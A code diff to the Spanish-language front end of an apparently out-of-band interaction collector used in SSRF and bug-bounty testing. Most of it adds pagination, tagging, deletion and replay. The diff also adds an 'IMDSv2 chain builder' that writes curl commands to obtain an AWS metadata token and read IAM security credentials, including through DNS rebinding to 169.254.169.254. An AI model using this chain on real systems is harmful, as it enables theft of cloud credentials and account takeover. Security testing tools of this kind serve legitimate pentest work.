@@ -21,6 +21,17 @@ let currentPayloads = [];
 // Timeline state
 let currentTimeline = null;
 
+// Detail panel state
+let currentDetailInteraction = null;
+
+// Feed pagination
+const FEED_PAGE_SIZE = 100;
+let feedOffset = 0;
+let feedHasMore = false;
+
+// Tag filter debounce
+let tagFilterDebounce = null;
+
 const STATUS_LABELS = {
   '': '–',
   'confirmed': '✓ Confirmed',
@@ -371,23 +382,83 @@ function programColor(program) {
 }
 
 // ── Interactions ───────────────────────────────────────────────────────────
-async function loadInteractions() {
-  const resp = await apiFetch('/api/interactions?limit=500');
-  const data = await resp.json();
-  interactions = data.interactions || [];
+async function loadInteractions(append = false) {
+  if (!append) feedOffset = 0;
+  const tag = document.getElementById('filter-tag')?.value.trim() || '';
+  const params = new URLSearchParams({ limit: FEED_PAGE_SIZE, offset: feedOffset });
+  if (tag) params.set('tag', tag);
+  try {
+    const resp = await apiFetch('/api/interactions?' + params);
+    const data = await resp.json();
+    const items = data.interactions || [];
+    if (append) {
+      const existingIds = new Set(interactions.map(x => x.id));
+      const newItems = items.filter(x => !existingIds.has(x.id));
+      interactions.push(...newItems);
+    } else {
+      interactions = items;
+    }
+    feedOffset += items.length;
+    feedHasMore = items.length === FEED_PAGE_SIZE;
+  } catch (_) { feedHasMore = false; }
   applyFilters();
+  updateLoadMoreButton();
+}
+
+async function loadMoreInteractions() {
+  if (!feedHasMore) return;
+  const btn = document.getElementById('load-more-btn');
+  btn.disabled = true;
+  btn.textContent = 'Cargando...';
+  const tag = document.getElementById('filter-tag')?.value.trim() || '';
+  const params = new URLSearchParams({ limit: FEED_PAGE_SIZE, offset: feedOffset });
+  if (tag) params.set('tag', tag);
+  try {
+    const resp = await apiFetch('/api/interactions?' + params);
+    const data = await resp.json();
+    const items = data.interactions || [];
+    const existingIds = new Set(interactions.map(x => x.id));
+    const newItems = items.filter(x => !existingIds.has(x.id));
+    interactions.push(...newItems);
+    feedOffset += items.length;
+    feedHasMore = items.length === FEED_PAGE_SIZE;
+    // Apply current client-side filters to new items and append to DOM
+    const uuid    = document.getElementById('filter-uuid').value.trim().toLowerCase();
+    const type    = document.getElementById('filter-type').value;
+    const program = document.getElementById('filter-program').value.trim().toLowerCase();
+    const feed = document.getElementById('interactions-feed');
+    for (const i of newItems) {
+      if (uuid && !(i.uuid || '').toLowerCase().includes(uuid)) continue;
+      if (type && i.type !== type) continue;
+      if (program) { const s = sessions[i.uuid]; if (!s || !s.program.toLowerCase().includes(program)) continue; }
+      filteredInteractions.push(i);
+      feed.appendChild(buildRow(i, false));
+    }
+  } catch (_) { feedHasMore = false; }
+  updateLoadMoreButton();
+  btn.disabled = false;
+  btn.textContent = 'Cargar más';
+}
+
+function updateLoadMoreButton() {
+  const btn = document.getElementById('load-more-btn');
+  if (!btn) return;
+  btn.classList.toggle('hidden', !feedHasMore || searchMode);
+  btn.disabled = false;
+  btn.textContent = 'Cargar más';
 }
 
 function renderFeed() {
   const feed = document.getElementById('interactions-feed');
   feed.innerHTML = '';
-  for (const i of filteredInteractions.slice(0, 300)) feed.appendChild(buildRow(i, false));
-  document.getElementById('total-count').textContent = interactions.length + ' interacciones';
+  for (const i of filteredInteractions) feed.appendChild(buildRow(i, false));
+  document.getElementById('total-count').textContent = feedOffset + ' interacciones';
 }
 
 function buildRow(i, isNew) {
   const row = document.createElement('div');
   row.className = 'interaction-row' + (isNew ? ' new' : '');
+  row.dataset.iid = i.id;
   row.onclick = () => showDetail(i);
 
   const typeDisplay = i.type || 'http';
@@ -409,6 +480,7 @@ function buildRow(i, isNew) {
     <span class="interaction-path" title="${escHtml(path)}">${programBadge}${escHtml(truncate(path, session ? 48 : 60))}</span>
     <span class="interaction-time" data-ts="${tsMs}" title="${exactTime}">${relTime}</span>
     <button class="btn-uuid-copy" onclick="event.stopPropagation();copyText('${escHtml(i.uuid)}')" title="Copiar UUID: ${escHtml(i.uuid)}">📋</button>
+    <button class="btn-row-delete" onclick="deleteInteraction(${i.id},event)" title="Eliminar esta interacción">🗑</button>
     ${i.decoded_data ? `<span class="interaction-decoded">⬡ ${escHtml(truncate(i.decoded_data, 80))}</span>` : ''}
   `;
   return row;
@@ -432,11 +504,27 @@ function applyFilters() {
   renderFeed();
 }
 
+function onTagFilterInput(val) {
+  clearTimeout(tagFilterDebounce);
+  tagFilterDebounce = setTimeout(() => {
+    feedOffset = 0;
+    loadInteractions(false);
+  }, 350);
+}
+
 function clearFilters() {
   document.getElementById('filter-uuid').value = '';
   document.getElementById('filter-type').value = '';
   document.getElementById('filter-program').value = '';
-  applyFilters();
+  const tagEl = document.getElementById('filter-tag');
+  const hadTag = tagEl && tagEl.value.trim();
+  if (tagEl) tagEl.value = '';
+  if (hadTag) {
+    feedOffset = 0;
+    loadInteractions(false);
+  } else {
+    applyFilters();
+  }
 }
 
 async function deleteUUID() {
@@ -463,6 +551,7 @@ async function doSearch(q) {
     searchMode = true;
     searchQuery = q;
     searchResults = data.interactions || [];
+    document.getElementById('load-more-btn')?.classList.add('hidden');
     document.getElementById('feed-title').textContent =
       `Búsqueda: "${q}" — ${searchResults.length} resultado${searchResults.length !== 1 ? 's' : ''}`;
     document.getElementById('clear-search-btn').classList.remove('hidden');
@@ -482,10 +571,13 @@ function clearSearch() {
   document.getElementById('feed-title').textContent = 'Interacciones en tiempo real';
   document.getElementById('clear-search-btn').classList.add('hidden');
   applyFilters();
+  updateLoadMoreButton();
 }
 
 // ── Detail panel ───────────────────────────────────────────────────────────
 function showDetail(i) {
+  currentDetailInteraction = i;
+
   document.getElementById('payload-history-panel').classList.add('hidden');
   document.getElementById('payload-output').classList.add('hidden');
   document.getElementById('timeline-panel').classList.add('hidden');
@@ -498,6 +590,13 @@ function showDetail(i) {
   } else {
     timelineBtn.classList.add('hidden');
   }
+
+  const replayBtn = document.getElementById('detail-replay-btn');
+  replayBtn.classList.toggle('hidden', i.type !== 'http');
+  replayBtn.disabled = false;
+  replayBtn.textContent = '↺ Replay';
+
+  document.getElementById('detail-delete-btn').classList.remove('hidden');
 
   const ctxEl = document.getElementById('session-context');
   const session = sessions[i.uuid];
@@ -517,18 +616,25 @@ function showDetail(i) {
     ctxEl.classList.add('hidden');
   }
 
+  document.getElementById('interaction-tags').classList.remove('hidden');
+  renderTags(i.tags || [], i.id);
+  document.getElementById('tag-input').value = '';
+
   const content = {
     id: i.id, uuid: i.uuid, type: i.type, timestamp: i.timestamp,
     source_ip: i.source_ip, path: i.path, method: i.method,
     query_name: i.query_name, query_type: i.query_type,
     user_agent: i.user_agent, decoded_data: i.decoded_data,
     headers: tryParseJSON(i.headers), body: i.body, raw_data: i.raw_data,
+    tags: i.tags || [],
   };
   document.getElementById('detail-content').innerHTML = jsonHighlight(JSON.stringify(content, null, 2));
 }
 
 function closeDetail() {
+  currentDetailInteraction = null;
   document.getElementById('interaction-detail').classList.add('hidden');
+  document.getElementById('interaction-tags').classList.add('hidden');
   loadAndShowHistory();
 }
 
@@ -1025,8 +1131,211 @@ function showToast(msg) {
   setTimeout(() => toast.remove(), 2000);
 }
 
+// ── Tags ───────────────────────────────────────────────────────────────────
+function renderTags(tags, iid) {
+  const el = document.getElementById('tags-list');
+  if (!el) return;
+  el.innerHTML = '';
+  if (!tags || tags.length === 0) {
+    const hint = document.createElement('span');
+    hint.className = 'muted-hint';
+    hint.style.fontSize = '11px';
+    hint.textContent = 'Sin etiquetas — escribe y pulsa Enter para añadir';
+    el.appendChild(hint);
+    return;
+  }
+  tags.forEach(t => {
+    const chip = document.createElement('span');
+    chip.className = 'tag-chip';
+    chip.textContent = t;
+    const btn = document.createElement('button');
+    btn.textContent = '×';
+    btn.title = 'Eliminar etiqueta';
+    btn.onclick = () => removeTag(iid, t);
+    chip.appendChild(btn);
+    el.appendChild(chip);
+  });
+}
+
+async function addTag() {
+  if (!currentDetailInteraction) return;
+  const input = document.getElementById('tag-input');
+  const tag = input.value.trim();
+  if (!tag) return;
+  try {
+    const resp = await apiFetch(`/api/interactions/${currentDetailInteraction.id}/tags`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tag }),
+    });
+    const data = await resp.json();
+    if (Array.isArray(data.tags)) {
+      currentDetailInteraction.tags = data.tags;
+      const idx = interactions.findIndex(x => x.id === currentDetailInteraction.id);
+      if (idx >= 0) interactions[idx].tags = data.tags;
+      renderTags(data.tags, currentDetailInteraction.id);
+      input.value = '';
+    }
+  } catch (_) {}
+}
+
+async function removeTag(iid, tag) {
+  try {
+    const resp = await apiFetch(`/api/interactions/${iid}/tags`, {
+      method: 'DELETE',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tag }),
+    });
+    const data = await resp.json();
+    if (Array.isArray(data.tags)) {
+      if (currentDetailInteraction && currentDetailInteraction.id === iid) {
+        currentDetailInteraction.tags = data.tags;
+        renderTags(data.tags, iid);
+      }
+      const idx = interactions.findIndex(x => x.id === iid);
+      if (idx >= 0) interactions[idx].tags = data.tags;
+    }
+  } catch (_) {}
+}
+
+// ── Delete individual interaction ──────────────────────────────────────────
+async function deleteInteraction(id, event) {
+  if (event) event.stopPropagation();
+  try {
+    await apiFetch(`/api/interaction/${id}`, { method: 'DELETE' });
+    interactions = interactions.filter(x => x.id !== id);
+    filteredInteractions = filteredInteractions.filter(x => x.id !== id);
+    if (currentDetailInteraction && currentDetailInteraction.id === id) closeDetail();
+    // Remove row from DOM without full re-render
+    const feed = document.getElementById('interactions-feed');
+    const rows = feed.querySelectorAll('.interaction-row');
+    rows.forEach(r => { if (r.dataset.iid === String(id)) r.remove(); });
+    applyFilters();
+    showToast('Interacción eliminada');
+  } catch (_) { showToast('Error al eliminar'); }
+}
+
+function deleteCurrentInteraction() {
+  if (currentDetailInteraction) deleteInteraction(currentDetailInteraction.id);
+}
+
+// ── Replay ─────────────────────────────────────────────────────────────────
+async function replayInteraction() {
+  if (!currentDetailInteraction || currentDetailInteraction.type !== 'http') return;
+  const btn = document.getElementById('detail-replay-btn');
+  btn.disabled = true;
+  btn.textContent = '⟳ Replaying...';
+  try {
+    const resp = await apiFetch(`/api/interactions/${currentDetailInteraction.id}/replay`, {
+      method: 'POST',
+    });
+    const data = await resp.json();
+    if (data.ok) {
+      showToast(`Replay OK — HTTP ${data.status} en ${data.ms}ms`);
+    } else {
+      showToast(`Replay falló: ${data.error || 'sin respuesta'}`);
+    }
+  } catch (_) {
+    showToast('Error en replay');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '↺ Replay';
+  }
+}
+
+// ── IMDSv2 Chain Builder ────────────────────────────────────────────────────
+function updateChainCurls() {
+  const rebindEnabled = document.getElementById('chain-rebind-enable')?.checked;
+  let target;
+  if (rebindEnabled) {
+    const rbUUID = document.getElementById('chain-rebind-uuid')?.value.trim() || '<UUID>';
+    target = rbUUID + '.' + DOMAIN;
+  } else {
+    target = (document.getElementById('chain-target')?.value || '169.254.169.254').trim();
+  }
+  const ttl   = (document.getElementById('chain-ttl')?.value   || '21600').trim();
+  const token = (document.getElementById('chain-token')?.value || '').trim() || '<TOKEN>';
+  const role  = (document.getElementById('chain-role')?.value  || '').trim() || '<ROLE>';
+
+  const el1 = document.getElementById('chain-curl-1');
+  if (el1) el1.textContent =
+    `curl -s -X PUT "http://${target}/latest/api/token" \\\n` +
+    `  -H "X-aws-ec2-metadata-token-ttl-seconds: ${ttl}"`;
+
+  const el2a = document.getElementById('chain-curl-2a');
+  if (el2a) el2a.textContent =
+    `curl -s "http://${target}/latest/meta-data/iam/security-credentials/" \\\n` +
+    `  -H "X-aws-ec2-metadata-token: ${token}"`;
+
+  const el2b = document.getElementById('chain-curl-2b');
+  if (el2b) el2b.textContent =
+    `curl -s "http://${target}/latest/meta-data/iam/security-credentials/${role}" \\\n` +
+    `  -H "X-aws-ec2-metadata-token: ${token}"`;
+}
+
+function toggleChainRebind() {
+  const enabled = document.getElementById('chain-rebind-enable').checked;
+  document.getElementById('chain-direct-fields').classList.toggle('hidden', enabled);
+  document.getElementById('chain-rebind-fields').classList.toggle('hidden', !enabled);
+  updateChainCurls();
+}
+
+async function setupChainRebind() {
+  const uuid      = document.getElementById('chain-rebind-uuid').value.trim();
+  const publicIp  = document.getElementById('chain-rebind-public-ip').value.trim();
+  const switchAfter = parseInt(document.getElementById('chain-rebind-switch').value) || 1;
+  if (!uuid || !publicIp) { showToast('UUID y VPS IP son necesarios'); return; }
+  const btn = document.getElementById('chain-rebind-setup-btn');
+  btn.disabled = true; btn.textContent = '⟳ Configurando...';
+  try {
+    const resp = await apiFetch('/api/rebind', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        uuid, public_ip: publicIp, private_ip: '169.254.169.254', switch_after: switchAfter,
+      }),
+    });
+    const data = await resp.json();
+    if (data.error) { showToast('Error: ' + data.error); }
+    else { showToast(`Rebinding configurado — ${uuid}.${DOMAIN}`); updateChainCurls(); }
+  } catch (_) { showToast('Error configurando rebinding'); }
+  btn.disabled = false; btn.textContent = '⚙ Configurar Rebinding';
+}
+
+async function runChainStep1() {
+  const target = (document.getElementById('chain-target').value || '127.0.0.1').trim();
+  const ttl = parseInt(document.getElementById('chain-ttl').value) || 21600;
+  const btn = document.getElementById('chain-run-btn');
+  btn.disabled = true;
+  btn.textContent = '⟳ Running...';
+  try {
+    const resp = await apiFetch('/api/chain/imdsv2/step1', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, ttl }),
+    });
+    const data = await resp.json();
+    if (data.ok && data.token) {
+      const resultEl = document.getElementById('chain-token-result');
+      const tokenEl = document.getElementById('chain-token');
+      resultEl.classList.remove('hidden');
+      tokenEl.value = data.token;
+      updateChainCurls();
+      showToast(`Token capturado en ${data.ms}ms`);
+    } else {
+      showToast(`Step 1 falló: ${data.error || 'sin token en respuesta'}`);
+    }
+  } catch (_) {
+    showToast('Error conectando con el backend');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '▶ Run vs SSRF-BOX';
+  }
+}
+
 // ── Init ───────────────────────────────────────────────────────────────────
 gopherRedisChange(); // pre-populate Redis template fields on load
+updateChainCurls();  // pre-populate chain builder curls on load
 
 function updateRelativeTimes() {
   document.querySelectorAll('.interaction-time[data-ts]').forEach(el => {
